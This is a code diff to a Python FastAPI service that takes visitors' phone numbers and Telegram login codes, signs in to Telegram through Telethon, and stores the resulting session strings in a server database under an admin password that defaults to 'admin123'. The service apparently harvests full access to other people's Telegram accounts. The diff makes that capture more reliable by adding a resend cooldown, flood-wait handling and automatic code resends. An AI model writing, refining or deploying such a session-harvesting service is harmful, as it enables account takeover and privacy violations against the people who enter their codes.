@@ -22,6 +22,7 @@ API_HASH = os.getenv("API_HASH")
 ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
 
 DB = "sessions.db"
+RESEND_COOLDOWN = 65  # seconds
 
 # === DATABASE ===
 def init():
@@ -29,6 +30,7 @@ def init():
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.execute("CREATE TABLE IF NOT EXISTS attempts (phone TEXT, count INT, time TEXT)")
     conn.execute("CREATE TABLE IF NOT EXISTS code_hashes (phone TEXT UNIQUE, hash TEXT, time TEXT)")
+    conn.execute("CREATE TABLE IF NOT EXISTS last_sent (phone TEXT UNIQUE, time TEXT)")
     conn.commit()
     conn.close()
 init()
@@ -47,6 +49,7 @@ def save_session(phone, session):
                  (phone, session, datetime.utcnow().isoformat()))
     conn.execute("DELETE FROM attempts WHERE phone = ?", (phone,))
     conn.execute("DELETE FROM code_hashes WHERE phone = ?", (phone,))
+    conn.execute("DELETE FROM last_sent WHERE phone = ?", (phone,))
     conn.commit()
     conn.close()
 
@@ -94,17 +97,41 @@ def delete_code_hash(phone):
     conn.commit()
     conn.close()
 
-# === FORCE FRESH CODE ===
-async def send_fresh_code(phone):
-    delete_code_hash(phone)  # ← CRITICAL: Remove old hash
+def get_last_sent(phone):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute("SELECT time FROM last_sent WHERE phone = ?", (phone,))
+    row = c.fetchone()
+    conn.close()
+    return datetime.fromisoformat(row[0]) if row else None
+
+def set_last_sent(phone):
+    conn = sqlite3.connect(DB)
+    conn.execute("REPLACE INTO last_sent (phone, time) VALUES (?, ?)",
+                 (phone, datetime.utcnow().isoformat()))
+    conn.commit()
+    conn.close()
+
+# === SAFE RESEND ===
+async def send_code_safe(phone):
+    last = get_last_sent(phone)
+    if last:
+        wait = RESEND_COOLDOWN - (datetime.utcnow() - last).total_seconds()
+        if wait > 0:
+            return False, f"Wait {int(wait)} seconds before resending."
+
+    delete_code_hash(phone)
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
         sent = await client.send_code_request(phone, force_sms=False)
         save_code_hash(phone, sent.phone_code_hash)
+        set_last_sent(phone)
         await client.disconnect()
         clear_attempts(phone)
         return True, "New code sent!"
+    except FloodWaitError as e:
+        return False, f"Wait {e.seconds} seconds (Telegram limit)."
     except Exception as e:
         await client.disconnect()
         return False, str(e)
@@ -119,7 +146,7 @@ async def home(request: Request):
 async def send_code(phone: str = Form(...)):
     if phone_exists(phone):
         return JSONResponse({"error": "You already have a session. Contact admin."})
-    success, msg = await send_fresh_code(phone)
+    success, msg = await send_code_safe(phone)
     return JSONResponse({"ok": success, "msg": msg} if success else {"error": msg})
 
 @app.post("/code")
@@ -129,11 +156,12 @@ async def verify_code(phone: str = Form(...), code: str = Form(...)):
 
     attempts = inc_attempt(phone)
     if attempts > 3:
-        return JSONResponse({"error": "Too many attempts. <button onclick=\"resend()\">Resend Code</button>"})
+        success, msg = await send_code_safe(phone)
+        return JSONResponse({"error": f"Too many attempts. {msg}"})
 
     code_hash = get_code_hash(phone)
     if not code_hash:
-        success, msg = await send_fresh_code(phone)
+        success, msg = await send_code_safe(phone)
         if not success:
             return JSONResponse({"error": msg})
         code_hash = get_code_hash(phone)
@@ -147,8 +175,8 @@ async def verify_code(phone: str = Form(...), code: str = Form(...)):
         save_session(phone, session_str)
         return JSONResponse({"session": session_str})
     except PhoneCodeExpiredError:
-        success, msg = await send_fresh_code(phone)
-        return JSONResponse({"error": f"Code expired. {msg} <button onclick=\"resend()\">Try Again</button>"})
+        success, msg = await send_code_safe(phone)
+        return JSONResponse({"error": f"Code expired. {msg}"})
     except PhoneCodeInvalidError:
         return JSONResponse({"error": f"Wrong code. Attempt {attempts}/3"})
     except SessionPasswordNeededError:
